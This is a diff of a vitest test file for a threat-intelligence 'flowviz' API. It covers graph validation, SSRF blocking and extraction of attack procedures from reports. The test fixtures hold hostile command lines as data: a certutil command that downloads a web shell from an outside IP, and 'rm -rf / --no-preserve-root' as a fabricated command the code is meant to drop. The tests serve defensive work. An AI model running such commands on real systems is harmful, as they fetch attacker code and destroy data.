@@ -11,11 +11,8 @@ import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { Hono } from 'hono';
 import type { Env } from '../../src/env';
 import { flowvizRouter } from '../../src/routes/flowviz';
-import {
-  validateFlowvizGraph,
-  parseFlowvizJson,
-  validateFlowvizUrl,
-} from '../../src/lib/flowviz-validate';
+import { normalizeFlowvizModel } from '../../src/routes/flowviz';
+import { validateFlowvizGraph, parseFlowvizJson, validateFlowvizUrl } from '../../src/lib/flowviz-validate';
 import { extractArticleLite } from '../../src/routes/flowviz';
 import { reconcileProcedureExtraction } from '../../src/lib/procedure-extract';
 import { checkProcedureTuple, isWellFormedProcedureName, djb2Hex } from '../../src/lib/x-procedure';
@@ -52,7 +49,19 @@ beforeEach(() => vi.restoreAllMocks());
 describe('validateFlowvizGraph', () => {
   const good = {
     nodes: [
-      { id: 'action-1', type: 'action', data: { type: 'action', name: 'Phishing', technique_id: 'T1566', tactic_id: 'TA0001', tactic_name: 'Initial Access', source_excerpt: 'x', confidence: 'high' } },
+      {
+        id: 'action-1',
+        type: 'action',
+        data: {
+          type: 'action',
+          name: 'Phishing',
+          technique_id: 'T1566',
+          tactic_id: 'TA0001',
+          tactic_name: 'Initial Access',
+          source_excerpt: 'x',
+          confidence: 'high',
+        },
+      },
       { id: 'tool-1', type: 'tool', data: { type: 'tool', name: 'calc.exe', source_excerpt: 'y' } },
     ],
     edges: [{ id: 'edge-1', source: 'action-1', target: 'tool-1', type: 'floating', label: 'Uses' }],
@@ -111,6 +120,15 @@ describe('extractArticleLite', () => {
   });
 });
 
+describe('normalizeFlowvizModel', () => {
+  it('accepts oss, defaults everything else to auto', () => {
+    expect(normalizeFlowvizModel('oss')).toBe('oss');
+    expect(normalizeFlowvizModel('auto')).toBe('auto');
+    expect(normalizeFlowvizModel('claude')).toBe('auto');
+    expect(normalizeFlowvizModel(undefined)).toBe('auto');
+  });
+});
+
 describe('flowviz routes', () => {
   it('GET /flowviz/ returns the index', async () => {
     const r = await req(setup(), '/api/v1/flowviz/', makeEnv([{ id: 'T1566', name: 'Phishing', tactics: [] }]));
@@ -145,6 +163,24 @@ describe('flowviz routes', () => {
     });
     expect(r.status).toBe(400);
   });
+  it('POST /flowviz/analyze 400 names what was received', async () => {
+    const r = await req(setup(), '/api/v1/flowviz/analyze', makeEnv(), {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ text: 'too short' }),
+    });
+    const body = (await r.json()) as { message: string };
+    expect(body.message).toMatch('text=9 chars');
+  });
+  it('POST /flowviz/analyze 400 calls out an empty body', async () => {
+    const r = await req(setup(), '/api/v1/flowviz/analyze', makeEnv(), {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({}),
+    });
+    const body = (await r.json()) as { message: string };
+    expect(body.message).toMatch('no usable');
+  });
   it('GET /flowviz/fetch-article blocks SSRF targets', async () => {
     const r = await req(setup(), '/api/v1/flowviz/fetch-article?url=http://localhost:3000/x', makeEnv());
     expect(r.status).toBe(400);
@@ -152,22 +188,46 @@ describe('flowviz routes', () => {
 });
 
 describe('procedure reconciliation', () => {
-  const source = 'The actor ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp to download a web shell. Royal ransomware encrypted the domain controller.';
+  const source =
+    'The actor ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp to download a web shell. Royal ransomware encrypted the domain controller.';
   const valid = new Set(['T1105', 'T1486']);
   it('keeps verbatim entities, drops invented technique ids and fabricated commands', () => {
     const rec = reconcileProcedureExtraction(
       {
-        entities: [{ kind: 'malware', value: 'Royal ransomware' }, { kind: 'actor', value: 'Invented Panda' }],
-        chunks: [{ id: 'c1', text: 'Download web shell via certutil', excerpt: 'The actor ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp to download a web shell', order: 0 }],
+        entities: [
+          { kind: 'malware', value: 'Royal ransomware' },
+          { kind: 'actor', value: 'Invented Panda' },
+        ],
+        chunks: [
+          {
+            id: 'c1',
+            text: 'Download web shell via certutil',
+            excerpt:
+              'The actor ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp to download a web shell',
+            order: 0,
+          },
+        ],
         techniques: [
-          { chunkId: 'c1', techniqueId: 'T1105', confidence: 'definite', quote: 'ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp' },
+          {
+            chunkId: 'c1',
+            techniqueId: 'T1105',
+            confidence: 'definite',
+            quote: 'ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp',
+          },
           { chunkId: 'c1', techniqueId: 'T9999', confidence: 'definite', quote: 'zzz' },
         ],
         drafts: [
           {
-            chunkId: 'c1', name: 'Download web shell via certutil', description: 'd', techniqueIds: ['T1105'],
-            platforms: ['Windows'], tactics: ['command-and-control'],
-            commandLines: ['certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp', 'rm -rf / --no-preserve-root'],
+            chunkId: 'c1',
+            name: 'Download web shell via certutil',
+            description: 'd',
+            techniqueIds: ['T1105'],
+            platforms: ['Windows'],
+            tactics: ['command-and-control'],
+            commandLines: [
+              'certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp',
+              'rm -rf / --no-preserve-root',
+            ],
             confidence: 80,
           },
         ],
